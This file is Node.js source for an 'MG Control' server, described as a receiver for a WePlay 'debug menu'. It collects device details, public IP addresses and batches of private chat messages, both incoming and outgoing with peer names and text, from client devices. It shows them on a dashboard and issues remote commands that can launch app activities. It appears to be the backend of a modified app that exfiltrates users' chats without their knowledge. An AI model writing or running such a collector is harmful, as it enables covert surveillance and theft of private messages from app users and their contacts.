import http from "node:http";
import { URL } from "node:url";

const port = Number(process.env.PORT || 3000);

const devices = new Map();
const messagesByDevice = new Map();
const seenMids = new Set();

let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);

    if (req.method === "GET" && url.pathname === "/") {
      return html(res, renderDashboard());
    }

    if (req.method === "GET" && url.pathname === "/api/data") {
      return json(res, command);
    }

    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readBody(req);
      command = {
        title: "MG Menu",
        text: String(body.text || "Server online"),
        action: body.activity ? "launch" : "none",
        activity: String(body.activity || "")
      };
      redirect(res, "/");
      return;
    }

    if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);
      if (!deviceId) return json(res, { ok: false, error: "deviceId required" }, 400);

      const now = Date.now();
      const device = {
        deviceId,
        myUid: number(body.myUid),
        publicId: clean(body.publicId),
        myName: clean(body.myName),
        model: clean(body.model),
        brand: clean(body.brand),
        batteryPercent: optionalNumber(body.batteryPercent),
        networkType: clean(body.networkType),
        publicIp: publicIp(req),
        clientLastSeen: number(body.lastSeen) || now,
        serverLastSeen: now,
        createdAt: devices.get(deviceId)?.createdAt || now
      };
      devices.set(deviceId, device);
      return json(res, { ok: true });
    }

    if (req.method === "POST" && isChatBatchPath(url.pathname)) {
      const body = await readBody(req);
      const deviceId = clean(body.deviceId);
      if (!deviceId) return json(res, { ok: false, error: "deviceId required" }, 400);

      const list = Array.isArray(body.messages) ? body.messages.slice(0, 50) : [];
      let inserted = 0;
      let skipped = 0;

      if (!devices.has(deviceId)) {
        devices.set(deviceId, {
          deviceId,
          myUid: number(body.myUid),
          publicId: clean(body.publicId),
          myName: "",
          model: "",
          brand: "",
          batteryPercent: null,
          networkType: "",
          publicIp: publicIp(req),
          clientLastSeen: Date.now(),
          serverLastSeen: Date.now(),
          createdAt: Date.now()
        });
      }

      const feed = messagesByDevice.get(deviceId) || [];
      for (const raw of list) {
        const mid = clean(raw.mid);
        if (!mid) {
          skipped++;
          continue;
        }
        const key = `${deviceId}:${mid}`;
        if (seenMids.has(key)) {
          skipped++;
          continue;
        }
        seenMids.add(key);
        feed.push({
          deviceId,
          mid,
          direction: raw.direction === "out" ? "out" : "in",
          peerUid: number(raw.peerUid),
          peerName: clean(raw.peerName),
          text: clean(raw.text).slice(0, 500),
          time: number(raw.time) || Date.now(),
          receivedAt: Date.now()
        });
        inserted++;
      }
      messagesByDevice.set(deviceId, feed.slice(-1000));
      return json(res, { ok: true, inserted, skipped });
    }

    if (req.method === "GET" && url.pathname === "/api/debug") {
      return json(res, {
        devices: Array.from(devices.values()),
        messages: Object.fromEntries(messagesByDevice)
      });
    }

    json(res, { ok: false, error: "not found" }, 404);
  } catch (error) {
    console.error(error);
    json(res, { ok: false, error: "server error" }, 500);
  }
});

server.listen(port, () => {
  console.log(`MG control server listening on ${port}`);
});

function isHeartbeatPath(pathname) {
  return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
}

function isChatBatchPath(pathname) {
  return pathname === "/api/chat/batch" || pathname === "/api/v1/chat/batch";
}

function renderDashboard() {
  const deviceList = Array.from(devices.values()).sort((a, b) => b.serverLastSeen - a.serverLastSeen);
  const selectedId = deviceList[0]?.deviceId || "";
  const selectedMessages = selectedId ? messagesByDevice.get(selectedId) || [] : [];
  const totalMessages = Array.from(messagesByDevice.values()).reduce((sum, list) => sum + list.length, 0);

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>MG Control</title>
  <style>
    :root{color-scheme:dark}
    body{margin:0;background:#080b10;color:#e8eef7;font-family:Inter,system-ui,-apple-system,Segoe UI,Arial,sans-serif}
    header{height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;border-bottom:1px solid #1f2937;background:#0c111a}
    h1{font-size:16px;margin:0} small{color:#8b98a8}
    main{display:grid;grid-template-columns:320px 1fr;min-height:calc(100vh - 56px)}
    aside{border-right:1px solid #1f2937;background:#0c111a;padding:14px}
    section{padding:18px}
    .stat{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
    .box,.device,.panel{border:1px solid #1f2937;background:#101722;border-radius:10px}
    .box{padding:12px}.box b{font-size:20px}
    .device{display:block;width:100%;text-align:left;color:inherit;margin-bottom:10px;padding:12px}
    .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px;background:#64748b}
    .on{background:#22c55e}.name{font-weight:700}.meta{font-size:12px;color:#94a3b8;margin-top:5px}
    .panel{padding:14px;margin-bottom:14px}
    input,textarea,button{width:100%;box-sizing:border-box;border-radius:8px;border:1px solid #273449;background:#0b1018;color:#eef2f8;padding:10px;margin-top:8px}
    button{background:#e5e7eb;color:#111827;font-weight:700;cursor:pointer}
    table{width:100%;border-collapse:collapse}.table{overflow:auto}
    th,td{text-align:left;border-bottom:1px solid #1f2937;padding:10px;font-size:13px;vertical-align:top}
    th{color:#94a3b8;font-weight:600}.msg-in{color:#93c5fd}.msg-out{color:#86efac}
    .empty{border:1px dashed #293548;border-radius:10px;padding:30px;text-align:center;color:#64748b}
    @media(max-width:800px){main{grid-template-columns:1fr}aside{border-right:0;border-bottom:1px solid #1f2937}}
  </style>
</head>
<body>
  <header>
    <div><h1>MG Control</h1><small>Render receiver for WePlay debug menu</small></div>
    <small>${new Date().toLocaleString()}</small>
  </header>
  <main>
    <aside>
      <div class="stat">
        <div class="box"><small>Devices</small><br><b>${deviceList.length}</b></div>
        <div class="box"><small>Messages</small><br><b>${totalMessages}</b></div>
      </div>
      ${deviceList.length ? deviceList.map(renderDevice).join("") : `<div class="empty">No devices yet</div>`}
    </aside>
    <section>
      <div class="panel">
        <b>Menu Command</b>
        <form method="post" action="/panel/command">
          <textarea name="text" rows="2" placeholder="Status text">${esc(command.text)}</textarea>
          <input name="activity" placeholder="Activity class optional" value="${esc(command.activity)}">
          <button>Save command</button>
        </form>
      </div>
      <div class="panel">
        <b>Latest Messages</b>
        ${selectedMessages.length ? renderMessages(selectedMessages.slice().reverse().slice(0, 200)) : `<div class="empty">No messages yet</div>`}
      </div>
    </section>
  </main>
</body>
</html>`;
}

function renderDevice(device) {
  const online = Date.now() - device.serverLastSeen < 60_000;
  return `<div class="device">
    <div><span class="dot ${online ? "on" : ""}"></span><span class="name">${esc(device.myName || device.publicId || "UID " + device.myUid || device.deviceId)}</span></div>
    <div class="meta">${esc(device.brand)} ${esc(device.model)} | ${esc(device.networkType)} | ${device.batteryPercent ?? "?"}%</div>
    <div class="meta">UID ${esc(device.myUid)} ${device.publicId ? "| " + esc(device.publicId) : ""}</div>
    <div class="meta">${esc(device.publicIp)} | ${ago(device.serverLastSeen)}</div>
    <div class="meta">${esc(device.deviceId)}</div>
  </div>`;
}

function renderMessages(messages) {
  return `<div class="table"><table>
    <thead><tr><th>Time</th><th>Peer</th><th>Dir</th><th>Text</th><th>MID</th></tr></thead>
    <tbody>${messages.map((m) => `<tr>
      <td>${esc(new Date(m.time).toLocaleString())}</td>
      <td>${esc(m.peerName || "UID " + m.peerUid)}</td>
      <td class="${m.direction === "out" ? "msg-out" : "msg-in"}">${esc(m.direction)}</td>
      <td>${esc(m.text)}</td>
      <td><small>${esc(m.mid)}</small></td>
    </tr>`).join("")}</tbody>
  </table></div>`;
}

async function readBody(req) {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString("utf8");
  if (!raw) return {};
  const type = req.headers["content-type"] || "";
  if (String(type).includes("application/x-www-form-urlencoded")) {
    return Object.fromEntries(new URLSearchParams(raw));
  }
  try {
    return JSON.parse(raw);
  } catch {
    return {};
  }
}

function json(res, payload, status = 200) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(body);
}

function html(res, body) {
  res.writeHead(200, {
    "content-type": "text/html; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(body);
}

function redirect(res, location) {
  res.writeHead(302, { location });
  res.end();
}

function publicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string" && forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "";
}

function clean(value) {
  return value == null ? "" : String(value);
}

function number(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function esc(value) {
  return clean(value).replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[char]));
}

function ago(time) {
  const diff = Math.max(0, Date.now() - Number(time));
  if (diff < 60_000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3_600_000) return `${Math.floor(diff / 60_000)}m ago`;
  return `${Math.floor(diff / 3_600_000)}h ago`;
}
